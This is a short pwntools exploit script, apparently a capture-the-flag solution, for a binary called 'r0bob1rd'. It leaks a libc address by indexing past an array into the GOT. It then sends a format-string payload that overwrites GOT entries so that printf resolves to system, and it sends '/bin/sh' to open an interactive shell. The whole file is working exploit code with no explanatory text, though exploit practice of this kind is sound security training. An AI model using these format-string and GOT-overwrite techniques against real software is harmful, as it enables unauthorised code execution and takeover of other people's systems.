from pwn import *

# io = process('./r0bob1rd')
io = remote('fill', 0)
elfexe = ELF('r0bob1rd')
libc = ELF('./glibc/libc.so.6')

context.bits = 64

# leak libc
option_input = str((elfexe.got['printf'] - elfexe.symbols['robobirdNames']) // 8)
io.sendline(option_input.encode())
io.recvuntil(b"You've chosen: ")

stack_chk_fail_leak = u64(io.recv(numb=6).ljust(8, b'\x00'))
libc.address =  stack_chk_fail_leak - libc.symbols['printf'] # should probably check numb

# assert libc.address == io.libc.address
print(libc.address)

# rop
io.clean()
fmt_payload = fmtstr_payload(8, {elfexe.got['__stack_chk_fail']: 0x0400aca, elfexe.got['printf']: libc.symbols['system']}, write_size='short') + b'A' * 2
print(len(fmt_payload))
io.send(fmt_payload)

io.recvuntil(b'> ')
io.sendline('/bin/sh')


io.interactive()
